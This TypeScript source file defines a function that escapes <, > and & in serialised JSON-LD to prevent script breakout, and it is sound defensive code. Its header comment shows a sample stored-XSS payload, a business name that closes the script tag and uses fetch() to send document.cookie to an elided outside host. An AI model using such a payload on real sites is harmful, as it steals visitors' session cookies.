/**
 * Serialising JSON-LD for a `<script>` element, safely.
 *
 * ---------------------------------------------------------------------------
 * **`JSON.stringify` is not enough, and the reason is easy to miss.** It
 * escapes what JSON needs escaped — quotes, backslashes, control characters —
 * and `<` is none of those. So a value containing `</script>` survives
 * serialisation intact, and an HTML parser reading the resulting element ends
 * the script *there*, at the first `</script` it sees, regardless of the JSON
 * around it. Everything after that is markup.
 *
 * On `/[slug]` the payload is built from `business.name`, `description`,
 * `address`, `phone` and every service name — all free text a tenant types
 * into a form. A shop named
 *
 *     </script><script>fetch('https://…?c='+document.cookie)</script>
 *
 * is 62 characters, inside the 80 the settings form allows, and it would run
 * in the browser of every client who opened that shop's booking page. The page
 * needs no login and the URL is a genuine `bazman.app` address, which is what
 * makes it worth phishing with rather than merely a self-inflicted wound.
 *
 * **The fix is to escape at the HTML layer, not to sanitise the data.**
 * Stripping `<` from a business name would corrupt legitimate values and would
 * have to be repeated at every sink. Escaping the three characters that can
 * terminate or reopen an element is lossless: `<` is still `<` to a JSON
 * parser, so the structured data Google reads is byte-for-byte the intended
 * document, and the HTML parser never sees a tag.
 *
 * `>` and `&` are not strictly required once `<` is handled — no valid HTML
 * break-out survives without it — but they are escaped too because this
 * function's whole job is to be obviously correct rather than minimally
 * correct, and the cost is three characters.
 * ---------------------------------------------------------------------------
 */

/**
 * Characters that let a string inside a `<script>` body escape it.
 *
 * Written as a character class rather than three `replaceAll` calls so the set
 * is one thing to read and one thing to extend.
 */
const HTML_BREAKOUT = /[<>&]/g;

const ESCAPES: Record<string, string> = {
  "<": "\\u003c",
  ">": "\\u003e",
  "&": "\\u0026",
};

/**
 * JSON for a `<script type="application/ld+json">` body.
 *
 * The escaping happens **after** serialisation, on the finished string, rather
 * than on each value going in — a nested object, an array element or a key
 * would otherwise each need remembering, and the one that got forgotten would
 * be the hole.
 */
export function serialiseJsonLd(data: unknown): string {
  return JSON.stringify(data).replace(
    HTML_BREAKOUT,
    (character) => ESCAPES[character] ?? character,
  );
}
